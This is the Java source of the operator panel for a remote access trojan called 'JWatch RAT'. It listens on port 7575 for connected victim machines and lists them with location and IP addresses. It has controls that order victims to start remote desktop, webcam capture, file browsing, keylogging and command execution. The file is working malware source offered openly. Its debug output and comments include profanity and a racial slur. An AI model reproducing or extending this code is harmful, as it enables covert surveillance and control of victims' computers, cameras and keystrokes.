//import java.awt.Font;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
//import java.awt.event.WindowListener;
import java.io.IOException;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.locks.ReentrantLock;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.ListSelectionModel;
//import javax.swing.SwingUtilities;
import javax.swing.event.TableModelEvent;
import javax.swing.event.TableModelListener;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.JTableHeader;
import javax.swing.table.TableCellRenderer;
import javax.swing.table.DefaultTableModel;

public class Window extends JFrame{
	
//	private final DefaultTableModel clientTableModel = new DefaultTableModel({{"sdsdf", "f"}, {"s"}}, {"Name", "Flag", "Country", "OS", "IP"}};

 
	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	private final JTable clientList;
	private final JButton btnRemoteDesktop = new JButton("Remote Desktop");
	private final JButton btnWebcam = new JButton("Webcam");
	private final JButton btnFileManager = new JButton("File Manager");
	private final JButton btnKeyLogger = new JButton("Keylogger");
	private final JButton btnCmd = new JButton("Run Command");
	private final JButton btnTaskManager = new JButton("Task Manager");
	private final JButton moreIPInfo = new JButton("More IP Info");
	private final JButton btnUpdateAll = new JButton("Update Client");
	private final JButton btnDisconnect = new JButton("Disconnect");
	private final DefaultTableModel model;
	private final static int PORT = 7575; 
	private static List<ClientInfo> connectedClients = new ArrayList<ClientInfo>();
	ReentrantLock lock = new ReentrantLock(true);

	
	public Window() {

		super("JWatch RAT - Welcome to the New Generation");
//		ReentrantLock lock = new ReentrantLock();


		setSize(500, 394);
		setResizable(false);
		setDefaultCloseOperation(EXIT_ON_CLOSE);
		setLocationRelativeTo(null);
		setLayout(null);
		
		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setSize(300, 352);
		scrollPane.setLocation(10, 10);
		String[] columnNames = {"Name", "Flag", "Country", "City", "OS", "Internal IP", "External IP"};
		Object[][] data = new Object[0][0];
		model = new DefaultTableModel(data, columnNames);
		clientList = new JTable(model) {
			/**
			 * 
			 */
			private static final long serialVersionUID = 1L;

			//  Returning the Class of each column will allow different
            //  renderers to be used based on Class
			@SuppressWarnings({ "unchecked", "rawtypes" })
			public Class getColumnClass(int column)
            {
                return getValueAt(0, column).getClass();
            }
        };
        
        Object monitor = new Object(); //for sleeping better synchronization
		new Thread(new ClientConnector(PORT,(ArrayList<ClientInfo>)(connectedClients), lock, model, monitor)).start();
		new Thread(new ServerConnectionChecker((ArrayList<ClientInfo>)(connectedClients), lock, model, monitor)).start();

        
		clientList.setAutoResizeMode(JTable.AUTO_RESIZE_OFF);
		clientList.getTableHeader().setReorderingAllowed(false);
		clientList.getTableHeader().setResizingAllowed(false);
//		clientList.setSize(400,10000);
		clientList.getColumnModel().getColumn(0).setPreferredWidth(100);
		clientList.getColumnModel().getColumn(1).setPreferredWidth(100);
		clientList.getColumnModel().getColumn(2).setPreferredWidth(100);
		clientList.getColumnModel().getColumn(3).setPreferredWidth(100);
		clientList.getColumnModel().getColumn(4).setPreferredWidth(100);
		clientList.getColumnModel().getColumn(5).setPreferredWidth(100);
		clientList.getColumnModel().getColumn(6).setPreferredWidth(100);

		
//		clientList.setModel(new DefaultTableModel());
		
//		final Font fonte = new Font("Serif", Font.PLAIN, 11);
//        clientList.setFont(fonte);


		model.addTableModelListener(
				new TableModelListener() {
					public void tableChanged(TableModelEvent e) {
						ColumnResizer.resize(clientList, model, e);
					}
				});
		
//		DefaultTableModel model = (DefaultTableModel) clientList.getModel();
//		model.addRow(new Object[]{"asasg", "2343.", "sgdsg",  "gses", "sgdgsgsdgsdwefewfewfwwefwefg", "sfsdfds", "dsfsdf"});
//		model.addRow(new Object[]{"asasgaaaaa", "234f.", "sdsfs",  "gsgefwes", "sgddg", "sfsdfdsdsfcdsffs", "sfsf"});
//		model.addRow(new Object[]{"asasgaaaaa", "ds3","23fwefwefwefwefwefwefwewwef.", "gsgefwes", "sgddg", "sfsdfdsdsfcqwdqwdqwwddsffs", "sdfsd"});


		clientList.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
		JTableHeader clientHeader = clientList.getTableHeader();
		TableCellRenderer rendererFromHeader = clientHeader.getDefaultRenderer();
//		clientHeader.setPreferredSize(new Dimension);
		JLabel headerLabel = (JLabel) rendererFromHeader;
		
		headerLabel.setHorizontalAlignment(JLabel.CENTER);
		scrollPane.getViewport().add(clientList);
//		scrollPane.

		
		btnRemoteDesktop.setLocation(330, 10);
		btnRemoteDesktop.setSize(150, 25);
		btnWebcam.setLocation(330, 50);
		btnWebcam.setSize(150, 25);
		btnFileManager.setLocation(330, 90);
		btnFileManager.setSize(150, 25);
		btnKeyLogger.setLocation(330, 130);
		btnKeyLogger.setSize(150, 25);
		btnCmd.setLocation(330, 170);
		btnCmd.setSize(150, 25);
		btnTaskManager.setLocation(330, 210);
		btnTaskManager.setSize(150, 25);
		moreIPInfo.setLocation(330, 250);
		moreIPInfo.setSize(150, 25);
		btnUpdateAll.setLocation(330, 290);
		btnUpdateAll.setSize(150, 25);
		btnDisconnect.setLocation(330, 330);
		btnDisconnect.setSize(150, 25);
		
		addButtonListeners(); //Adds all button listeners
		
		add(scrollPane);
		add(btnRemoteDesktop);
		add(btnWebcam);
		add(btnFileManager);
		add(btnKeyLogger);
		add(btnCmd);
		add(btnTaskManager);
		add(moreIPInfo);
		add(btnUpdateAll);
		add(btnDisconnect);
		
//		clientTableModel.addElement(new ClientInfo(null, "Fuckhead"));
		
		setVisible(true);
		
	}
	
	private void addButtonListeners() {
		
		btnFileManager.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					System.out.println("\n\n\n\nI CLICK BUTTON FILE MANAGER SOCKETS OPEN: " + getClientFromRowNum(getSelectedClient()).getNumSubSocketsByType("fileManager"));

					int rowNum = getSelectedClient();
					if(rowNum == -1)  {
						return; //if rowNum equals -1 just automatically end this method.
					}
					final ClientInfo requestedClient = getClientFromRowNum(rowNum);
					if(requestedClient.getNumSubSocketsByType("fileManager") != 0) {
						System.out.println("FILEMANAGER SUCK MY DICK");
						return; //else if it's 0 move forward!
					}
					OutputStream pw;
					try {
						pw = requestedClient.getCommandSocket().getOutputStream();
						byte[] temp = {(byte)3};
						pw.write(temp, 0, 1);
						while(true) {
							if(requestedClient.getNumSubSocketsByType("fileManager") == 2) {
								break;
							}
							
							System.out.println("WAITING FOR FILE MANAGER !!!");
						}
//				        SwingUtilities.invokeLater(new Runnable() {
//				            public void run() {
				            	System.out.println("DON'T FREEZE ON ME MOTHERFOCKER.");
				            	//JFrame fileBrowser = 
						    new FileBrowser(requestedClient, 
								new WindowAdapter() {
							public void windowClosing(WindowEvent e) {
								byte[] temp = new byte[1];
								int rowNum = getSelectedClient();
								
								//HAPPENS WHEN LET'S SAY I HAVE JFRAME OPEN. MAIN HAD CLOSED.
								//HOWEVER OTHER 2 SOCKETS FOR REMOTE CONTROL ARE OPEN.
								//SO DATA IS STILL BEING TRANSFERRED AROUND.
								//AS SOON AS ALL ARE CLOSED AT THE END
								//IN SERVERCONNECTIONCHECKER. THIS WILL BE ACTIVATED.
								//THIS METHOD WILL BE REACHED SINCE THIS LISTNER IS CALLED
								//DUE TO REMOTEDESKTOP THREAD DYING AFTER GETTING EXCEPTION.
								//SO THIS WILL RETURN A NULL SINCE THAT CLIENT HAS ALREADY 
								//BEEN REMOVED IN SERVERCONNECTIONCHECKER AND IS GONE ALREADY
								//SO NULL WILL BE RETURNED. NOW YOU WANNA IGNORE THAT AND JUST GET 
								//OUT OF THIS METHOD AS SOON AS POSSIBLE!
								//HOPE THAT CLEARS THINGS :)
								ClientInfo requestedClient = getClientFromRowNum(rowNum);
								if(requestedClient == null) {
									return; //just leave :)
								}

								//if requested client is null, it won't reach this place. :)
								 //FIND BASED ON WHAT TYPE IT IS IN THE SOCKET LIST :D
								
								//requestedClient is a clientInfo, which is client plus  
								//a bunch of miscellaneous stuff related to that client!
								System.out.println("HOW MANY FILE MANAGER SOCKETS BEFORE BEFORE BEFORE: " + requestedClient.getNumSubSocketsByType("fileManager"));
								try {
									SocketInfo rofl = requestedClient.getSubSocketInfo("fileManagerCommand");
									if(rofl == null) {
										return;
									}
									OutputStream out = requestedClient.getSubSocketInfo("fileManagerCommand").getSocket().getOutputStream();
						            temp[0] = (byte)10; 
						    		out.write(temp, 0, 1); //SENDS OUT 10 TO TELL CLIENT TO BREAK AND LEAVE AND QUIT :)
								} catch (IOException e1) {
									// TODO Auto-generated catch block
									e1.printStackTrace();
								}
								requestedClient.removeSocketsByType("fileManager");
								System.out.println("I REMOVED YOU NIGGA ! HOW MANY FILES AFTER MANAGER SOCKETS: " + requestedClient.getNumSubSocketsByType("fileManager"));
								
								
								
//								requestedClient.removeFirstSubSocket(); //when close socket, client and remote desktop
//								requestedClient.removeFirstSubSocket(); //when close socket, client and remote desktop
//								try {
//									OutputStream pw = requestedClient.getCommandSocket().getOutputStream();
//									pw.write(temp, 0, 1);
//								} catch (IOException e1) {
//									// TODO Auto-generated catch block
//									e1.printStackTrace();
//								} //send message that it wants to quit.
////								System.exit(0);
							}		
						}
								); //null is there just as dummy it's useless.
//						fileBrowser.start();
//				            
//				            }
//				        });
						
					} catch (IOException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}

				}
			});
		
		btnKeyLogger.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				
				//THIS WILL FIRST CHECK WHETHER REMOTECONTROL IS OPEN, IF NOT THEN MOVE FORWARD. if yes end RIGHT HERE
				//CUZ ALREADY OPEN!!!
				int rowNum = getSelectedClient();
				if(rowNum == -1)  {
					return; //if rowNum equals -1 just automatically end this method.
				}
				ClientInfo requestedClient = getClientFromRowNum(rowNum);
				if(requestedClient.getNumSubSocketsByType("keylogger") != 0) {
					System.out.println("COK COKCKK COCKK!!");
					return; //else if it's 0 move forward!
				}

				OutputStream pw;
				try {
//					if(requestedClient == null) {
//						System.out.println("HORSE!");
//					} 
//					if(requestedClient.getCommandSocket() == null) {
//						System.out.println("HOUSE!");
//					}
					pw = requestedClient.getCommandSocket().getOutputStream();
					byte[] temp = {(byte)5};
					pw.write(temp, 0, 1);
					while(true) {
						if(requestedClient.getNumSubSocketsByType("keylogger") == 1) {
							break;
						}
						
						System.out.println("FUCK DIS SHIT!");
//						System.out.println("NUMSUBSOCKETSWITHREMOTDESKTOP: " + requestedClient.getNumSubSocketsByType("remoteDesktop"));
//						System.out.println("NUM SUBSOCKETS: " + requestedClient.getNumSubSockets());
//						System.out.println("FUCK ME LORDY!");
					}
					//DON'T FORGET TO ADD THE LISTENERS FOR REMOTE CONTROL TOMORROW INSIDE REMOTE DESKTOP CLASS!!!
					Thread remoteKeylogger = new RemoteKeylogger(requestedClient, 
							new WindowAdapter() {
						public void windowClosing(WindowEvent e) {
//							byte[] temp = new byte[1];
							
							int rowNum = getSelectedClient();
							
							//HAPPENS WHEN LET'S SAY I HAVE JFRAME OPEN. MAIN HAD CLOSED.
							//HOWEVER OTHER 2 SOCKETS FOR REMOTE CONTROL ARE OPEN.
							//SO DATA IS STILL BEING TRANSFERRED AROUND.
							//AS SOON AS ALL ARE CLOSED AT THE END
							//IN SERVERCONNECTIONCHECKER. THIS WILL BE ACTIVATED.
							//THIS METHOD WILL BE REACHED SINCE THIS LISTNER IS CALLED
							//DUE TO REMOTEDESKTOP THREAD DYING AFTER GETTING EXCEPTION.
							//SO THIS WILL RETURN A NULL SINCE THAT CLIENT HAS ALREADY 
							//BEEN REMOVED IN SERVERCONNECTIONCHECKER AND IS GONE ALREADY
							//SO NULL WILL BE RETURNED. NOW YOU WANNA IGNORE THAT AND JUST GET 
							//OUT OF THIS METHOD AS SOON AS POSSIBLE!
							//HOPE THAT CLEARS THINGS :)
							ClientInfo requestedClient = getClientFromRowNum(rowNum);
							if(requestedClient == null) {
								return; //just leave :)
							}

							//if requested client is null, it won't reach this place. :)
							 //FIND BASED ON WHAT TYPE IT IS IN THE SOCKET LIST :D
							
							//requestedClient is a clientInfo, which is client plus  
							//a bunch of miscellaneous stuff related to that client!
							requestedClient.removeSocketsByType("keylogger");
							
							
//							requestedClient.removeFirstSubSocket(); //when close socket, client and remote desktop
//							requestedClient.removeFirstSubSocket(); //when close socket, client and remote desktop
//							try {
//								OutputStream pw = requestedClient.getCommandSocket().getOutputStream();
//								pw.write(temp, 0, 1);
//							} catch (IOException e1) {
//								// TODO Auto-generated catch block
//								e1.printStackTrace();
//							} //send message that it wants to quit.
////							System.exit(0);
						}		
					}
							
							);
					remoteKeylogger.start();
				} catch (IOException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
				
			}
		});
		
		
		
		
		btnRemoteDesktop.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				
				//THIS WILL FIRST CHECK WHETHER REMOTECONTROL IS OPEN, IF NOT THEN MOVE FORWARD. if yes end RIGHT HERE
				//CUZ ALREADY OPEN!!!
				int rowNum = getSelectedClient();
				if(rowNum == -1)  {
					return; //if rowNum equals -1 just automatically end this method.
				}
				ClientInfo requestedClient = getClientFromRowNum(rowNum);
				if(requestedClient.getNumSubSocketsByType("remoteDesktop") != 0) {
					System.out.println("COK COKCKK COCKK!!");
					return; //else if it's 0 move forward!
				}

				OutputStream pw;
				try {
//					if(requestedClient == null) {
//						System.out.println("HORSE!");
//					} 
//					if(requestedClient.getCommandSocket() == null) {
//						System.out.println("HOUSE!");
//					}
					pw = requestedClient.getCommandSocket().getOutputStream();
					byte[] temp = {(byte)2};
					pw.write(temp, 0, 1);
					while(true) {
						if(requestedClient.getNumSubSocketsByType("remoteDesktop") == 3) {
							break;
						}
						
						System.out.println("FUCK DIS SHIT!");
//						System.out.println("NUMSUBSOCKETSWITHREMOTDESKTOP: " + requestedClient.getNumSubSocketsByType("remoteDesktop"));
//						System.out.println("NUM SUBSOCKETS: " + requestedClient.getNumSubSockets());
//						System.out.println("FUCK ME LORDY!");
					}
					//DON'T FORGET TO ADD THE LISTENERS FOR REMOTE CONTROL TOMORROW INSIDE REMOTE DESKTOP CLASS!!!
					Thread remoteDesktop = new RemoteDesktop(requestedClient, 
							new WindowAdapter() {
						public void windowClosing(WindowEvent e) {
//							byte[] temp = new byte[1];
							
							int rowNum = getSelectedClient();
							
							//HAPPENS WHEN LET'S SAY I HAVE JFRAME OPEN. MAIN HAD CLOSED.
							//HOWEVER OTHER 2 SOCKETS FOR REMOTE CONTROL ARE OPEN.
							//SO DATA IS STILL BEING TRANSFERRED AROUND.
							//AS SOON AS ALL ARE CLOSED AT THE END
							//IN SERVERCONNECTIONCHECKER. THIS WILL BE ACTIVATED.
							//THIS METHOD WILL BE REACHED SINCE THIS LISTNER IS CALLED
							//DUE TO REMOTEDESKTOP THREAD DYING AFTER GETTING EXCEPTION.
							//SO THIS WILL RETURN A NULL SINCE THAT CLIENT HAS ALREADY 
							//BEEN REMOVED IN SERVERCONNECTIONCHECKER AND IS GONE ALREADY
							//SO NULL WILL BE RETURNED. NOW YOU WANNA IGNORE THAT AND JUST GET 
							//OUT OF THIS METHOD AS SOON AS POSSIBLE!
							//HOPE THAT CLEARS THINGS :)
							ClientInfo requestedClient = getClientFromRowNum(rowNum);
							if(requestedClient == null) {
								return; //just leave :)
							}

							//if requested client is null, it won't reach this place. :)
							 //FIND BASED ON WHAT TYPE IT IS IN THE SOCKET LIST :D
							
							//requestedClient is a clientInfo, which is client plus  
							//a bunch of miscellaneous stuff related to that client!
							requestedClient.removeSocketsByType("remoteDesktop");
							
							
//							requestedClient.removeFirstSubSocket(); //when close socket, client and remote desktop
//							requestedClient.removeFirstSubSocket(); //when close socket, client and remote desktop
//							try {
//								OutputStream pw = requestedClient.getCommandSocket().getOutputStream();
//								pw.write(temp, 0, 1);
//							} catch (IOException e1) {
//								// TODO Auto-generated catch block
//								e1.printStackTrace();
//							} //send message that it wants to quit.
////							System.exit(0);
						}		
					}
							
							);
					remoteDesktop.start();
				} catch (IOException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
				
			}
		});
		
		btnWebcam.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				
				//THIS WILL FIRST CHECK WHETHER REMOTECONTROL IS OPEN, IF NOT THEN MOVE FORWARD. if yes end RIGHT HERE
				//CUZ ALREADY OPEN!!!
				int rowNum = getSelectedClient();
				if(rowNum == -1)  {
					return; //if rowNum equals -1 just automatically end this method.
				}
				ClientInfo requestedClient = getClientFromRowNum(rowNum);
				if(requestedClient.getNumSubSocketsByType("webcam") != 0) {
					System.out.println("COK COKCKK COCKK!!");
					return; //else if it's 0 move forward!
				}

				OutputStream pw;
				try {
//					if(requestedClient == null) {
//						System.out.println("HORSE!");
//					} 
//					if(requestedClient.getCommandSocket() == null) {
//						System.out.println("HOUSE!");
//					}
					pw = requestedClient.getCommandSocket().getOutputStream();
					byte[] temp = {(byte)4};
					pw.write(temp, 0, 1);
					while(true) {
						if(requestedClient.getNumSubSocketsByType("webcam") == 2) {
							break;
						}
						
						System.out.println("FUCK DIS SHIT!");
//						System.out.println("NUMSUBSOCKETSWITHREMOTDESKTOP: " + requestedClient.getNumSubSocketsByType("remoteDesktop"));
//						System.out.println("NUM SUBSOCKETS: " + requestedClient.getNumSubSockets());
//						System.out.println("FUCK ME LORDY!");
					}
					//DON'T FORGET TO ADD THE LISTENERS FOR REMOTE CONTROL TOMORROW INSIDE REMOTE DESKTOP CLASS!!!
					Thread remoteWebcam = new RemoteWebcam(requestedClient, 
							new WindowAdapter() {
						public void windowClosing(WindowEvent e) {
//							byte[] temp = new byte[1];
							
							int rowNum = getSelectedClient();
							
							//HAPPENS WHEN LET'S SAY I HAVE JFRAME OPEN. MAIN HAD CLOSED.
							//HOWEVER OTHER 2 SOCKETS FOR REMOTE CONTROL ARE OPEN.
							//SO DATA IS STILL BEING TRANSFERRED AROUND.
							//AS SOON AS ALL ARE CLOSED AT THE END
							//IN SERVERCONNECTIONCHECKER. THIS WILL BE ACTIVATED.
							//THIS METHOD WILL BE REACHED SINCE THIS LISTNER IS CALLED
							//DUE TO REMOTEDESKTOP THREAD DYING AFTER GETTING EXCEPTION.
							//SO THIS WILL RETURN A NULL SINCE THAT CLIENT HAS ALREADY 
							//BEEN REMOVED IN SERVERCONNECTIONCHECKER AND IS GONE ALREADY
							//SO NULL WILL BE RETURNED. NOW YOU WANNA IGNORE THAT AND JUST GET 
							//OUT OF THIS METHOD AS SOON AS POSSIBLE!
							//HOPE THAT CLEARS THINGS :)
							ClientInfo requestedClient = getClientFromRowNum(rowNum);
							if(requestedClient == null) {
								return; //just leave :)
							}

							//if requested client is null, it won't reach this place. :)
							 //FIND BASED ON WHAT TYPE IT IS IN THE SOCKET LIST :D
							
							//requestedClient is a clientInfo, which is client plus  
							//a bunch of miscellaneous stuff related to that client!
							requestedClient.removeSocketsByType("webcam");
							
							
//							requestedClient.removeFirstSubSocket(); //when close socket, client and remote desktop
//							requestedClient.removeFirstSubSocket(); //when close socket, client and remote desktop
//							try {
//								OutputStream pw = requestedClient.getCommandSocket().getOutputStream();
//								pw.write(temp, 0, 1);
//							} catch (IOException e1) {
//								// TODO Auto-generated catch block
//								e1.printStackTrace();
//							} //send message that it wants to quit.
////							System.exit(0);
						}		
					}
							
							);
					remoteWebcam.start();
				} catch (IOException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
				
			}
		});
		
		
		
		
		
	}
	
//	public class WindowEventHandler extends WindowAdapter {
//		
//		public void windowClosing(WindowEvent e) {
//			byte[] temp = new byte[1];
//			int rowNum = getSelectedClient();
//			ClientInfo requestedClient = getClientFromRowNum(rowNum);
//			requestedClient.removeFirstSubSocket(); //when close socket, client and remote desktop
//			requestedClient.removeFirstSubSocket(); //when close socket, client and remote desktop
//			try {
//				OutputStream pw = requestedClient.getCommandSocket().getOutputStream();
//				pw.write(temp, 0, 1);
//			} catch (IOException e1) {
//				// TODO Auto-generated catch block
//				e1.printStackTrace();
//			} //send message that it wants to quit.
////			System.exit(0);
//		}
//	}
	
	//returns the client on that row.
	public ClientInfo getClientFromRowNum(int row) {
		String rowInternalIP = (String)model.getValueAt(row, 5);
		for(ClientInfo client: connectedClients) {
			if(client.getInternalIP().equals(rowInternalIP)) {
				return client;
			}
		}
		return null; //this can happen. happen when it gets removed midway :o
	}
	
	public int getSelectedClient() { //Gets the current client that is selected in the list
		return clientList.getSelectedRow();
	}
	
	
	public DefaultTableModel getModel() {
		return this.model;
	}
	
	@SuppressWarnings("unused")
	private class ClientTableModel extends AbstractTableModel {
	    /**
		 * 
		 */
		private static final long serialVersionUID = 1L;
		private String[] columnNames = {"Name", "Flag", "Country", "OS", "IP"};
	    private Object[][] data = {{"sdsdgdsgsg", "cutntstst", "sgdsgsgg", "233f", "t23432432424324"}};
	    
	    public int getColumnCount() {
	        return columnNames.length;
	    }

	    public int getRowCount() {
	    		return data.length;
	    }

	    public String getColumnName(int col) {
	        return columnNames[col];
	    }

	    public Object getValueAt(int row, int col) {
	        return data[row][col];
	    }

	    @SuppressWarnings({ "unchecked", "rawtypes" })
		public Class getColumnClass(int c) {
	        return getValueAt(0, c).getClass();
	    }

	    /*
	     * Don't need to implement this method unless your table's
	     * editable.
	     */
//	    public boolean isCellEditable(int row, int col) {
//	        //Note that the data/cell address is constant,
//	        //no matter where the cell appears onscreen.
//	        if (col < 2) {
//	            return false;
//	        } else {
//	            return true;
//	        }
//	    }

	    /*
	     * Don't need to implement this method unless your table's
	     * data can change.
	     */
//	    public void setValueAt(Object value, int row, int col) {
//	        data[row][col] = value;
//	        fireTableCellUpdated(row, col);
//	    }
	}
	

	


}
